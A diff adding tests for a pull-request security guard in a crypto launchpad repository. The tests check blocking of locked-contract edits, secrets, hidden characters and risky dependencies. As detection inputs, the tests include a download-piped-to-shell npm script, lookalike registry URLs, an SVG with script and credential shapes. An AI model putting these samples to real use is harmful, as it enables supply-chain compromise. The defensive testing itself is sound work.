@@ -1,0 +1,853 @@
+// Tests for pr-guard.mjs. Each case builds a small git repository shaped like this one, makes the change a pull request
+// would make, and asks the guard what it sees.  node --test .github/scripts/pr-guard.test.mjs
+//
+// Invisible characters are built from code points and credentials from pieces, so this file holds neither.
+
+import assert from "node:assert/strict";
+import { execFileSync, spawnSync } from "node:child_process";
+import { chmodSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { dirname, join } from "node:path";
+import { after, before, describe, test } from "node:test";
+import { fileURLToPath } from "node:url";
+
+import {
+  OWNERS, RULES, analyze, annotation, hiddenCharacter, hostOf, lintManifest, lintNpmLock, openRepo, ownerApproval, parseHunks,
+  parseLock, plain, renderSummary, renderText, scanLines, verdict,
+} from "./pr-guard.mjs";
+
+const GUARD = fileURLToPath(new URL("./pr-guard.mjs", import.meta.url));
+const cp = (...codes) => String.fromCodePoint(...codes);
+
+// ---------- fixture ----------
+
+const ROUTER = "0x6fF5693b99212Da76ad316178A184AB56D299b43";
+const STRANGER = "0x1234567890AbcdEF1234567890aBcdef12345678";
+const PIN = "886b4f8b63409ef474542de6394d25a9b5908ed3";
+const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(40, 1)]);
+
+const LOCK = [
+  "# deployed sources",
+  `sha256 ${"1b".repeat(32)}  contracts/src/LaunchFactory.sol`,
+  `sha256 ${"e3".repeat(32)}  contracts/src/LaunchLocker.sol`,
+  `sha256 ${"34".repeat(32)}  contracts/foundry.toml`,
+  `sha256 ${"77".repeat(32)}  contracts/deployments/launchpad-base.json`,
+  `gitlink ${PIN}  contracts/lib/forge-std`,
+  "",
+].join("\n");
+const LOCKED = parseLock(LOCK);
+
+const entry = (name, version, extra = {}) => ({
+  version,
+  resolved: `https://registry.npmjs.org/${name}/-/${name.split("/").pop()}-${version}.tgz`,
+  integrity: `sha512-${"A".repeat(86)}==`,
+  ...extra,
+});
+const lockfile = (packages) =>
+  `${JSON.stringify({ name: "openlaunch", lockfileVersion: 3, packages: { "": { name: "openlaunch" }, ...Object.fromEntries(Object.entries(packages).map(([name, e]) => [`node_modules/${name}`, e])) } }, null, 2)}\n`;
+const manifest = (fields) => `${JSON.stringify({ name: "openlaunch", private: true, scripts: { test: "tsx --test", build: "next build" }, dependencies: { sharp: "^0.35.4", viem: "^2.47.6" }, ...fields }, null, 2)}\n`;
+const BASE_LOCK = { sharp: entry("sharp", "0.35.4"), viem: entry("viem", "2.47.6"), esbuild: entry("esbuild", "0.28.2", { hasInstallScript: true }), "@scope/pkg": entry("@scope/pkg", "1.0.0") };
+
+const ROUTE = [
+  'import { verifyMessage } from "viem";',
+  "export async function POST(request) {",
+  "  if (await rateLimited(request)) return tooMany();",
+  "  const ok = await verifyMessage({ address, message, signature });",
+  "  if (!ok || !(await consumeNonce(nonce))) return denied();",
+  "  return save(await request.json());",
+  "}",
+  "",
+].join("\n");
+
+const BASE = {
+  "README.md": "# openlaunch\n\nLaunch should be open and free. Docs: https://openlaunch.lol/agents\n",
+  "LICENSE": "MIT\n",
+  "SECURITY.md": "Report to security@gitlawb.com\n",
+  ".gitignore": "node_modules/\n.env\n",
+  ".gitmodules": '[submodule "contracts/lib/forge-std"]\n\tpath = contracts/lib/forge-std\n\turl = https://github.com/foundry-rs/forge-std\n',
+  ".github/workflows/ci.yml": "name: ci\n",
+  ".github/workflows/pr-guard.yml": "name: pr-guard\n",
+  ".github/scripts/pr-guard.mjs": "// guard\n",
+  "contracts/deployed.lock": LOCK,
+  "contracts/foundry.toml": '[profile.default]\nsolc_version = "0.8.26"\n',
+  "contracts/src/LaunchFactory.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactory {}\n",
+  "contracts/src/LaunchLocker.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchLocker {}\n",
+  "contracts/deployments/launchpad-base.json": `{ "LaunchFactory": "0x815542E8b392389A1389E22E588E4B62A67Ade72" }\n`,
+  "contracts/script/check-deployed-sources.sh": { content: "#!/usr/bin/env bash\n", mode: 0o755 },
+  "contracts/lib/forge-std": { gitlink: PIN },
+  "app/package.json": manifest({}),
+  "app/package-lock.json": lockfile(BASE_LOCK),
+  "app/Dockerfile": "FROM node:22-slim\n",
+  "app/db/schema.sql": "create table if not exists launches (id text primary key);\n",
+  "app/public/logo.png": PNG,
+  "app/src/lib/security-headers.ts": "export const csp = \"default-src 'self'\";\n",
+  "app/src/lib/launchpad/config.ts": `export const NATIVE = "0x0000000000000000000000000000000000000000";\nexport const ROUTER = "${ROUTER}";\nexport const RPC = process.env.BASE_RPC_URL ?? "https://mainnet.base.org";\n`,
+  "app/src/app/api/post/route.ts": ROUTE,
+  "app/src/components/Hero.tsx": "export function Hero() {\n  return <h1>Launch should be open and free.</h1>;\n}\n",
+  "app/src/components/hero.test.ts": 'import test from "node:test";\ntest("hero", () => {});\n',
+};
+
+const GIT_ENV = {
+  ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", GIT_TERMINAL_PROMPT: "0",
+  GIT_AUTHOR_NAME: "test", GIT_AUTHOR_EMAIL: "test@example.com", GIT_COMMITTER_NAME: "test", GIT_COMMITTER_EMAIL: "test@example.com",
+};
+let dir, lockFile, baseSha;
+const git = (args, input) => execFileSync("git", args, { cwd: dir, input, env: GIT_ENV, stdio: ["pipe", "pipe", "pipe"] }).toString().trim();
+
+/**
+ * Write a set of changes and commit them. A value is the file's text or bytes; null deletes; { symlink }, { gitlink },
+ * { content, mode } and { index } (a file that exists only in git, for names a Mac cannot hold side by side) do the rest.
+ */
+function commit(files, message) {
+  const late = [];
+  for (const [path, value] of Object.entries(files)) {
+    const full = join(dir, path);
+    if (value === null) { rmSync(full, { recursive: true, force: true }); continue; }
+    if (value?.gitlink) { mkdirSync(full, { recursive: true }); late.push(["160000", value.gitlink, path]); continue; }
+    if (value?.index !== undefined) { late.push(["100644", git(["hash-object", "-w", "--stdin"], value.index), path]); continue; }
+    mkdirSync(dirname(full), { recursive: true });
+    rmSync(full, { recursive: true, force: true });
+    if (value?.symlink) { symlinkSync(value.symlink, full); continue; }
+    writeFileSync(full, value?.content ?? value);
+    if (value?.mode) chmodSync(full, value.mode);
+  }
+  git(["add", "-A", "-f"]); // -f: a pull request can force-add what .gitignore lists
+  for (const [mode, sha, path] of late) git(["update-index", "--add", "--cacheinfo", `${mode},${sha},${path}`]);
+  git(["commit", "-q", "--allow-empty", "-m", message]);
+  return git(["rev-parse", "HEAD"]);
+}
+
+/** The head commit of a pull request that makes `changes` on top of the base. */
+function pullRequest(changes) {
+  git(["checkout", "-q", "-f", "--detach", baseSha]);
+  git(["reset", "-q", "--hard", baseSha]);
+  git(["clean", "-fdxq"]);
+  return commit(changes, "pull request");
+}
+const check = (changes) => analyze(openRepo(dir, baseSha, pullRequest(changes)), { lockedPaths: LOCKED });
+const rules = (findings) => [...new Set(findings.map((f) => f.rule))].sort();
+const of = (findings, rule) => findings.filter((f) => f.rule === rule);
+const details = (findings, rule) => of(findings, rule).map((f) => f.detail).join(" | ");
+
+before(() => {
+  dir = mkdtempSync(join(tmpdir(), "pr-guard-"));
+  lockFile = join(mkdtempSync(join(tmpdir(), "pr-guard-lock-")), "deployed.lock");
+  writeFileSync(lockFile, LOCK);
+  git(["init", "-q", "-b", "main"]);
+  git(["config", "core.ignorecase", "false"]);
+  baseSha = commit(BASE, "base");
+});
+after(() => {
+  rmSync(dir, { recursive: true, force: true });
+  rmSync(dirname(lockFile), { recursive: true, force: true });
+});
+
+// ---------- the contract freeze ----------
+
+describe("deployed contracts", () => {
+  test("editing a locked source is blocked", () => {
+    const found = check({ "contracts/src/LaunchFactory.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactory { }\n" });
+    assert.deepEqual(rules(found), ["contract-locked"]);
+    assert.equal(found[0].tier, "block");
+    assert.equal(found[0].detail, "edited");
+  });
+
+  test("a one-byte change is enough", () => {
+    assert.deepEqual(rules(check({ "contracts/src/LaunchLocker.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchLocker {}\n\n" })), ["contract-locked"]);
+  });
+
+  test("deleting a locked source is blocked", () => {
+    const found = check({ "contracts/src/LaunchLocker.sol": null });
+    assert.deepEqual(rules(found), ["contract-locked"]);
+    assert.equal(found[0].detail, "deleted");
+  });
+
+  test("renaming a locked source is a deletion plus a new file", () => {
+    const found = check({ "contracts/src/LaunchFactory.sol": null, "contracts/src/Factory.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactory {}\n" });
+    assert.deepEqual(rules(found), ["contract-locked", "contracts"]);
+  });
+
+  test("the lock, its check script, the build settings and the deployment records are locked too", () => {
+    for (const path of ["contracts/deployed.lock", "contracts/script/check-deployed-sources.sh", "contracts/foundry.toml", "contracts/deployments/launchpad-base.json"]) {
+      assert.deepEqual(rules(check({ [path]: "changed\n" })), ["contract-locked"], path);
+    }
+  });
+
+  test("a locked file cannot be swapped for a symlink", () => {
+    assert.deepEqual(rules(check({ "contracts/foundry.toml": { symlink: "../app/package.json" } })), ["contract-locked", "symlink"]);
+  });
+
+  test("a new contract file is allowed, for an owner to read", () => {
+    const found = check({ "contracts/src/LaunchFactoryBnb.sol": "// SPDX-License-Identifier: MIT\ncontract LaunchFactoryBnb {}\n" });
+    assert.deepEqual(rules(found), ["contracts"]);
+    assert.equal(found[0].tier, "review");
+  });
+
+  test("a new contract that adds an owner or a pause names the ground rule it breaks", () => {
+    const found = check({ "contracts/src/Vault.sol": "contract Vault is Ownable {\n  /// no admin here\n  function stop() external onlyOwner { _pause(); }\n}\n" });
+    assert.deepEqual(rules(found), ["contract-rules", "contracts"]);
+    assert.match(details(found, "contract-rules"), /Ownable/);
+    assert.match(details(found, "contract-rules"), /onlyOwner/);
+    assert.doesNotMatch(details(found, "contract-rules"), /admin/, "comment lines are not code");
+  });
+
+  test("tests, scripts and docs under contracts/ need an owner as well", () => {
+    assert.deepEqual(rules(check({ "contracts/test/New.t.sol": "contract NewTest {}\n" })), ["contracts"]);
+    assert.deepEqual(rules(check({ "contracts/docs/NOTES.md": "notes\n" })), ["contracts"]);
+  });
+
+  test("re-pinning a library is blocked", () => {
+    const found = check({ "contracts/lib/forge-std": { gitlink: "1".repeat(40) } });
+    assert.deepEqual(rules(found), ["contract-locked", "submodule"]);
+    assert.match(details(found, "submodule"), /different commit/);
+  });
+
+  test("a new submodule anywhere is blocked, and so is the submodule table", () => {
+    const found = check({ "vendor/kit": { gitlink: "2".repeat(40) }, ".gitmodules": '[submodule "vendor/kit"]\n\tpath = vendor/kit\n\turl = https://github.com/someone/kit\n' });
+    assert.deepEqual(rules(found), ["contract-locked", "submodule"]);
+    assert.deepEqual(of(found, "submodule").map((f) => f.path), ["vendor/kit"]);
+  });
+
+  test("nothing is added beside the pinned libraries", () => {
+    const found = check({ "contracts/lib/v4-core/src/Hooks.sol": "library Hooks {}\n" });
+    assert.deepEqual(rules(found), ["contract-locked"]);
+    assert.equal(found[0].detail, "added");
+  });
+
+  test("a name that differs from a contract only by letter case is blocked", () => {
+    const found = check({ "contracts/src/launchfactory.sol": { index: "contract LaunchFactory { address owner; }\n" } });
+    assert.ok(rules(found).includes("case-collision"));
+    assert.match(details(found, "case-collision"), /contracts\/src\/LaunchFactory\.sol/);
+  });
+
+  test("a folder that differs only by letter case is caught as well", () => {
+    assert.ok(rules(check({ "Contracts/src/Extra.sol": { index: "contract Extra {}\n" } })).includes("case-collision"));
+  });
+
+  test("parseLock reads both kinds of line and always includes the lock's own guards", () => {
+    assert.ok(LOCKED.has("contracts/src/LaunchFactory.sol") && LOCKED.has("contracts/lib/forge-std"));
+    assert.ok(LOCKED.has("contracts/deployed.lock") && LOCKED.has(".gitmodules") && LOCKED.has("contracts/script/check-arc-factory.sh"));
+    assert.ok(!parseLock("sha256 nothex  contracts/src/X.sol\n").has("contracts/src/X.sol"));
+  });
+});
+
+// ---------- CI and developer machines ----------
+
+describe("CI and machine configuration", () => {
+  test("editing, adding or deleting anything under .github is blocked", () => {
+    assert.deepEqual(rules(check({ ".github/workflows/ci.yml": "name: ci\non: push\n" })), ["ci-config"]);
+    assert.deepEqual(rules(check({ ".github/workflows/extra.yml": "name: extra\n" })), ["ci-config"]);
+    assert.deepEqual(rules(check({ ".github/workflows/pr-guard.yml": null })), ["ci-config"]);
+    assert.deepEqual(rules(check({ ".github/scripts/pr-guard.mjs": "// no guard\n" })), ["ci-config"]);
+    assert.deepEqual(rules(check({ "CODEOWNERS": "* @someone\n" })), ["ci-config"]);
+  });
+
+  test("agent instructions, editor tasks and git hooks are blocked", () => {
+    for (const path of ["CLAUDE.md", "AGENTS.md", "app/AGENTS.md", ".claude/settings.json", ".cursor/rules/a.mdc", ".cursorrules", ".mcp.json", ".vscode/tasks.json", ".devcontainer/devcontainer.json", ".husky/pre-commit", ".envrc", "app/.envrc"]) {
+      const found = check({ [path]: "x\n" });
+      assert.ok(rules(found).includes("dev-machine"), path);
+      assert.ok(found.every((f) => f.rule !== "dev-machine" || f.tier === "block"), path);
+    }
+  });
+
+  test("tool managers that run hooks are covered", () => {
+    assert.ok(rules(check({ "mise.toml": "[hooks]\nenter = 'echo hi'\n" })).includes("dev-machine"));
+    assert.ok(rules(check({ ".lefthook.yml": "pre-commit:\n" })).includes("dev-machine"));
+  });
+
+  test("the match ignores letter case, because a Mac does", () => {
+    assert.ok(rules(check({ "claude.md": "x\n" })).includes("dev-machine"));
+  });
+
+  test("package manager configuration is blocked", () => {
+    assert.deepEqual(rules(check({ "app/.npmrc": "loglevel=error\n" })), ["registry-config"]);
+    assert.ok(rules(check({ ".yarnrc.yml": "npmRegistryServer: x\n" })).includes("registry-config"));
+  });
+
+  test("a symlink is blocked", () => {
+    assert.deepEqual(rules(check({ "app/public/readme": { symlink: "../../README.md" } })), ["symlink"]);
+  });
+
+  test("a file name with a line break or an invisible character is blocked", () => {
+    assert.ok(rules(check({ "app/src/a\nb.ts": "export {};\n" })).includes("odd-path"));
+    assert.ok(rules(check({ [`app/src/safe${cp(0x202e)}st.ts`]: "export {};\n" })).includes("odd-path"));
+  });
+});
+
+// ---------- credentials ----------
+
+describe("credentials", () => {
+  const key = "c0ffee".repeat(10) + "abcd";
+  test("environment, key and wallet files are blocked by name", () => {
+    for (const path of [".env", "app/.env.local", "app/.env.production", "contracts/.rh-lp-wallet.address", "deploy.pem", "contracts/keystore/deployer", "wallet-backup.json", ".aws/credentials"]) {
+      assert.ok(rules(check({ [path]: "x\n" })).includes("secret-file"), path);
+    }
+  });
+
+  test(".env.example is not a secret file", () => {
+    assert.deepEqual(rules(check({ "app/.env.example": "DATABASE_URL=postgres://localhost/openlaunch_dev\n" })), ["build-deploy"]);
+  });
+
+  test("a private key in code is blocked, and its value is never repeated", () => {
+    const found = check({ "app/scripts/deploy.mjs": `const PRIVATE_KEY = "0x${key}";\n` });
+    assert.ok(rules(found).includes("secret"));
+    const report = renderSummary(found, verdict(found, { author: "someone", sender: "someone" }), { headSha: "a".repeat(40) }) + renderText(found, verdict(found, {})) + JSON.stringify(found);
+    assert.ok(!report.includes(key), "the key must not be echoed into the public job log");
+  });
+
+  test("a transaction hash is not a key", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/tx.ts": `export const DEPLOY_TX = "0x${key}";\n` })), []);
+  });
+
+  test("tokens and keyed URLs are recognised by their shape", () => {
+    const samples = {
+      "a private key block": "-----BEGIN " + "EC PRIVATE KEY-----",
+      "an AWS access key": "AKIA" + "ABCDEFGHIJKLMNOP",
+      "a GitHub token": "ghp_" + "a1B2".repeat(9),
+      "an npm token": "npm_" + "a1B2".repeat(9),
+      "an RPC URL with its key": "https://base-mainnet.g.alchemy.com/v2/" + "abcDEF123456".repeat(2),
+      "a database URL with its password": "postgres://app:" + "s3cr3tPass99" + "@db.internal:5432/openlaunch",
+      "a recovery phrase": "mnemonic: " + Array.from({ length: 12 }, (_, i) => ["apple", "river", "stone"][i % 3]).join(" "),
+    };
+    for (const [what, value] of Object.entries(samples)) {
+      const found = scanLines("docs/notes.md", [{ n: 1, text: `value = ${value}` }], [], { addresses: new Set(), hosts: new Set(["base-mainnet.g.alchemy.com"]), env: new Set() });
+      assert.ok(of(found, "secret").some((f) => f.detail === what), what);
+    }
+  });
+
+  test("placeholders in documentation are not credentials", () => {
+    for (const text of ["postgres://postgres:postgres@127.0.0.1:5432/quote_indexer", "postgres://dev:devpass@localhost/app", "postgres://user:password@host:5432/db", "postgres://app:<password>@db.flycast:5432/app", "postgres://localhost/openlaunch_dev", "DATABASE_URL=postgres://app:${DB_PASSWORD}@db/app", "mnemonic: test test test test test test test test test test test junk"]) {
+      assert.deepEqual(of(scanLines("app/LAUNCH.md", [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(["host", "db.flycast", "db"]), env: new Set() }), "secret"), [], text);
+    }
+  });
+});
+
+// ---------- hidden characters ----------
+
+describe("hidden characters", () => {
+  const family = cp(0x1f468, 0x200d, 0x1f469, 0x200d, 0x1f467);
+  test("a text direction override is blocked", () => {
+    const found = check({ "app/src/lib/access.ts": `const role = "user${cp(0x202e)} // admin";\n` });
+    assert.deepEqual(rules(found), ["hidden-unicode"]);
+    assert.equal(found[0].line, 1);
+  });
+
+  test("zero-width and tag characters are blocked", () => {
+    assert.equal(hiddenCharacter(`is${cp(0x200b)}Admin`), "an invisible character");
+    assert.equal(hiddenCharacter(`note${cp(0xe0049, 0xe0067)}`), "an invisible character");
+    assert.equal(hiddenCharacter(`a${cp(0x1b)}[2K`), "a control character");
+    assert.equal(hiddenCharacter(`line${cp(0x2028)}break`), "an invisible character");
+  });
+
+  test("a joiner inside an emoji is fine, between letters it is not", () => {
+    assert.equal(hiddenCharacter(`family ${family} ok`), null);
+    assert.equal(hiddenCharacter(`ad${cp(0x200d)}min`), "a zero-width joiner outside an emoji");
+  });
+
+  test("a byte order mark is fine only at the very start of a file", () => {
+    assert.equal(hiddenCharacter(`${cp(0xfeff)}export {};`, true), null);
+    assert.equal(hiddenCharacter(`${cp(0xfeff)}export {};`, false), "a byte order mark inside the file");
+    assert.equal(hiddenCharacter(`export${cp(0xfeff)} {};`, true), "a byte order mark inside the file");
+  });
+
+  test("the same character written as an escape is visible, so it passes", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/strip.ts": `export const RLO = "\\${"u202E"}";\nexport const tabs = "a\\tb";\n` })), []);
+  });
+
+  test("plain text in other scripts and ordinary emoji pass", () => {
+    assert.equal(hiddenCharacter("Größe, 日本語, العربية, emoji 🚀 and " + family), null);
+  });
+});
+
+// ---------- binaries ----------
+
+describe("binary files", () => {
+  test("a real image passes without a finding", () => {
+    assert.deepEqual(rules(check({ "app/public/new.png": PNG })), []);
+  });
+
+  test("a file that is not what its name says is blocked", () => {
+    assert.deepEqual(rules(check({ "app/public/photo.png": "#!/bin/sh\necho hi\n" })), ["binary"]);
+    assert.deepEqual(rules(check({ "app/public/photo.jpg": PNG })), ["binary"]);
+  });
+
+  test("executables and archives are blocked", () => {
+    assert.deepEqual(rules(check({ "tools/helper": Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0, 1, 2, 3]) })), ["binary"]);
+    assert.deepEqual(rules(check({ "app/public/pack.wasm": Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]) })), ["binary"]);
+  });
+
+  test("source saved as UTF-16 counts as binary, because the scanner cannot read it", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/x.ts": Buffer.from("export const x = eval('1');\n", "utf16le") })), ["binary"]);
+  });
+
+  test("video needs an owner", () => {
+    assert.deepEqual(rules(check({ "brand/clip.mp4": Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from("ftypmp42"), Buffer.alloc(16)]) })), ["media"]);
+  });
+
+  test("an SVG with script or an event handler is blocked; a plain one passes", () => {
+    assert.deepEqual(rules(check({ "app/public/a.svg": '<svg viewBox="0 0 1 1"><script>alert(1)</script></svg>\n' })), ["svg-active"]);
+    assert.ok(rules(check({ "app/public/b.svg": '<svg onload="go()"><path d="M0 0h1"/></svg>\n' })).includes("svg-active"));
+    assert.deepEqual(rules(check({ "app/public/c.svg": '<svg viewBox="0 0 1 1"><path d="M0 0h1v1z"/></svg>\n' })), []);
+  });
+});
+
+// ---------- dependencies ----------
+
+describe("dependencies", () => {
+  const bump = { "app/package.json": manifest({ dependencies: { sharp: "^0.35.5", viem: "^2.47.6" } }), "app/package-lock.json": lockfile({ ...BASE_LOCK, sharp: entry("sharp", "0.35.5") }) };
+
+  test("a clean version bump needs an owner and says what moved", () => {
+    const found = check(bump);
+    assert.deepEqual(rules(found), ["dependencies"]);
+    assert.match(details(found, "dependencies"), /sharp \^0\.35\.4 → \^0\.35\.5/);
+    assert.match(details(found, "dependencies"), /1 changed: sharp@0\.35\.5/);
+  });
+
+  test("a new dependency is named", () => {
+    const found = check({ "app/package.json": manifest({ dependencies: { sharp: "^0.35.4", viem: "^2.47.6", leftpad: "^1.0.0" } }), "app/package-lock.json": lockfile({ ...BASE_LOCK, leftpad: entry("leftpad", "1.0.0") }) });
+    assert.deepEqual(rules(found), ["dependencies"]);
+    assert.match(details(found, "dependencies"), /leftpad \^1\.0\.0 added/);
+    assert.match(details(found, "dependencies"), /1 package added: leftpad@1\.0\.0/);
+  });
+
+  test("a lockfile entry from anywhere but the npm registry is blocked", () => {
+    for (const resolved of ["https://github.com/someone/sharp/tarball/main", "https://registry.npmjs.org.evil.io/sharp/-/sharp-0.35.4.tgz", "git+ssh://git@github.com/someone/sharp.git#abc", "http://registry.npmjs.org/sharp/-/sharp-0.35.4.tgz"]) {
+      const found = check({ "app/package-lock.json": lockfile({ ...BASE_LOCK, sharp: entry("sharp", "0.35.4", { resolved }) }) });
+      assert.ok(rules(found).includes("lockfile"), resolved);
+    }
+  });
+
+  test("an entry that resolves to another package's tarball is blocked", () => {
+    const found = lintNpmLock("app/package-lock.json", lockfile({ ...BASE_LOCK, viem: { ...entry("viem", "2.47.6"), resolved: "https://registry.npmjs.org/v1em/-/v1em-2.47.6.tgz" } }), lockfile(BASE_LOCK));
+    assert.match(details(found, "lockfile"), /viem@2\.47\.6 does not resolve to its own registry tarball/);
+  });
+
+  test("a missing or weak integrity hash is blocked", () => {
+    const { integrity: _dropped, ...bare } = entry("viem", "2.47.6");
+    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, viem: bare }), lockfile(BASE_LOCK))).includes("lockfile"));
+    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, viem: entry("viem", "2.47.6", { integrity: "sha1-abc=" }) }), lockfile(BASE_LOCK))).includes("lockfile"));
+  });
+
+  test("aliases, local links and bundled packages are blocked", () => {
+    const alias = lintNpmLock("p", lockfile({ ...BASE_LOCK, lodash: { ...entry("evil-lodash", "4.0.0"), name: "evil-lodash" } }), lockfile(BASE_LOCK));
+    assert.match(details(alias, "lockfile"), /lodash is an alias for evil-lodash/);
+    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, local: { link: true, resolved: "../local" } }), lockfile(BASE_LOCK))).includes("lockfile"));
+    assert.ok(rules(lintNpmLock("p", lockfile({ ...BASE_LOCK, inner: { version: "1.0.0", inBundle: true } }), lockfile(BASE_LOCK))).includes("lockfile"));
+  });
+
+  test("a scoped package and a nested copy resolve under their own names", () => {
+    const nested = { ...JSON.parse(lockfile(BASE_LOCK)) };
+    nested.packages["node_modules/sharp/node_modules/@scope/pkg"] = entry("@scope/pkg", "2.0.0");
+    assert.deepEqual(rules(lintNpmLock("p", JSON.stringify(nested), lockfile(BASE_LOCK))), ["dependencies"]);
+  });
+
+  test("a new package with an install script is blocked; a bump of one that already had it is not", () => {
+    const fresh = check({ "app/package-lock.json": lockfile({ ...BASE_LOCK, miner: entry("miner", "1.0.0", { hasInstallScript: true }) }) });
+    assert.deepEqual(rules(fresh), ["dependencies", "install-script"]);
+    const bumped = check({ "app/package-lock.json": lockfile({ ...BASE_LOCK, esbuild: entry("esbuild", "0.29.0", { hasInstallScript: true }) }) });
+    assert.deepEqual(rules(bumped), ["dependencies"]);
+  });
+
+  test("an unreadable lockfile is blocked", () => {
+    assert.deepEqual(rules(check({ "app/package-lock.json": "{ not json" })), ["lockfile"]);
+    assert.deepEqual(rules(check({ "app/package-lock.json": '{ "lockfileVersion": 1, "dependencies": {} }\n' })), ["lockfile"]);
+  });
+
+  test("a lifecycle script in package.json is blocked", () => {
+    for (const name of ["preinstall", "postinstall", "prepare"]) {
+      const found = check({ "app/package.json": manifest({ scripts: { test: "tsx --test", build: "next build", [name]: "node setup.js" } }) });
+      assert.deepEqual(rules(found), ["install-script"], name);
+    }
+  });
+
+  test("a changed or added npm script needs an owner", () => {
+    const found = check({ "app/package.json": manifest({ scripts: { test: "true", build: "next build", pretest: "node x.js" } }) });
+    assert.deepEqual(rules(found), ["dependencies"]);
+    assert.match(details(found, "dependencies"), /npm script "test" changed/);
+    assert.match(details(found, "dependencies"), /npm script "pretest" added/);
+  });
+
+  test("a dependency from git, a URL, a folder or under an alias is blocked", () => {
+    for (const spec of ["github:someone/viem", "git+https://github.com/someone/viem.git", "https://example.org/viem.tgz", "file:../viem", "npm:v1em@^2.0.0", "someone/viem#main"]) {
+      const found = lintManifest("app/package.json", manifest({ dependencies: { sharp: "^0.35.4", viem: spec } }), manifest({}));
+      assert.deepEqual(rules(found), ["dependency-source"], spec);
+    }
+  });
+
+  test("an override is read like any other dependency", () => {
+    const found = lintManifest("app/package.json", manifest({ overrides: { viem: { ox: "github:someone/ox" } } }), manifest({}));
+    assert.match(details(found, "dependency-source"), /viem > ox comes from "github:someone\/ox"/);
+  });
+
+  test("ordinary version ranges are not mistaken for off-registry sources", () => {
+    for (const spec of ["^1.2.3", "~1.2.3", "1.2.3", ">=1.2.3 <2", "1.x", "*", "latest", "19.2.3", "^16.3.8-canary.1"]) {
+      assert.deepEqual(rules(lintManifest("app/package.json", manifest({ dependencies: { sharp: "^0.35.4", viem: spec } }), manifest({}))), ["dependencies"], spec);
+    }
+  });
+
+  test("a second package manager's lockfile, or a second manifest, needs an owner", () => {
+    assert.deepEqual(rules(check({ "app/yarn.lock": "# yarn lockfile v1\n" })), ["dependencies"]);
+    assert.match(details(check({ "tools/package.json": '{ "name": "tools" }\n' }), "dependencies"), /a new package manifest/);
+  });
+
+  test("a download piped to a shell inside an npm script is called out", () => {
+    const found = check({ "app/package.json": manifest({ scripts: { test: "tsx --test", build: "curl -s https://example.org/i.sh | sh && next build" } }) });
+    assert.deepEqual(rules(found), ["dangerous-code", "dependencies"]);
+  });
+});
+
+// ---------- application code ----------
+
+describe("application code", () => {
+  const config = BASE["app/src/lib/launchpad/config.ts"];
+
+  test("swapping an address is caught, and a new one is marked as new", () => {
+    const found = check({ "app/src/lib/launchpad/config.ts": config.replace(ROUTER, STRANGER) });
+    assert.deepEqual(rules(found), ["address"]);
+    assert.equal(found[0].detail, `${STRANGER} (new to the repository)`);
+    assert.equal(found[0].line, 2);
+  });
+
+  test("an address the repository already has is still shown, marked as known", () => {
+    const found = check({ "app/src/lib/launchpad/extra.ts": `export const FEE_TO = "${ROUTER.toLowerCase()}";\n` });
+    assert.match(details(found, "address"), /already in the repository/);
+  });
+
+  test("the zero and burn addresses, hashes, and addresses in tests are not findings", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/x.ts": `const a = "0x${"0".repeat(40)}", b = "0x000000000000000000000000000000000000dEaD", h = "0x${"ab".repeat(32)}";\n` })), []);
+    assert.deepEqual(rules(check({ "app/src/lib/x.test.ts": `const who = "${STRANGER}";\n` })), []);
+  });
+
+  test("an address in the README needs an owner too", () => {
+    assert.deepEqual(rules(check({ "README.md": `${BASE["README.md"]}\nFactory: ${STRANGER}\n` })), ["address"]);
+  });
+
+  test("wallet calls are flagged in app code and ignored in tests", () => {
+    const found = check({ "app/src/components/Buy.tsx": 'await writeContract(config, { address, abi, functionName: "approve", args: [spender, maxUint256] });\n' });
+    assert.deepEqual(rules(found), ["wallet-call"]);
+    assert.match(details(found, "wallet-call"), /writeContract/);
+    assert.match(details(found, "wallet-call"), /functionName: "approve"/);
+    assert.match(details(found, "wallet-call"), /maxUint256/);
+    assert.deepEqual(rules(check({ "app/src/components/buy.test.ts": "await signMessage({ message });\n" })), []);
+  });
+
+  test("a wallet RPC method is a quoted string; a database column that starts with wallet_ is not one", () => {
+    assert.match(details(check({ "app/src/lib/switch.ts": 'await provider.request({ method: "wallet_switchEthereumChain", params });\n' }), "wallet-call"), /"wallet_switchEthereumChain"/);
+    assert.deepEqual(rules(check({ "app/src/lib/q.ts": "const rows = await sql`select wallet_fees_quote_paid from fees`;\n" })), []);
+  });
+
+  test("a new host is flagged, in code, tests and docs; a known or local one is not", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/track.ts": 'await fetch("https://collect.metrics-cdn.io/v1", { method: "POST", body });\n' })), ["new-host"]);
+    assert.deepEqual(rules(check({ "app/src/lib/track.test.ts": 'await fetch("https://collect.metrics-cdn.io/v1");\n' })), ["new-host"]);
+    assert.deepEqual(rules(check({ "README.md": `${BASE["README.md"]}Claim here: https://openlaunch-airdrop.xyz\n` })), ["new-host"]);
+    assert.deepEqual(rules(check({ "app/src/lib/rpc.ts": 'const a = "https://mainnet.base.org/x", b = "http://localhost:3000", c = "http://127.0.0.1:8545";\n' })), []);
+  });
+
+  test("a host that only a lockfile mentions is still new to the code", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/meta.ts": 'await fetch("https://registry.npmjs.org/-/npm/v1/tokens");\n' })), ["new-host"]);
+  });
+
